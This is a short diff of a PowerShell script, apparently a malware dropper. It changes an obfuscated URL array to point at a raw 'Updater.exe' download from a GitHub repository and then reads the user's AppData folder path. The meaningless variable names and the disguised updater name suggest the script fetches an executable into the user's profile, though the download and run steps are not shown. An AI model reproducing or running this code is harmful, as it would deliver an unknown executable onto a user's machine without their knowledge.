@@ -1,5 +1,5 @@
 $gfgff = @(
-    "https://github.com"
+    "https://github.com/JqrkaSt3al/GovnoBuilds/raw/refs/heads/main/Updater.exe"
 )
 $dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
 
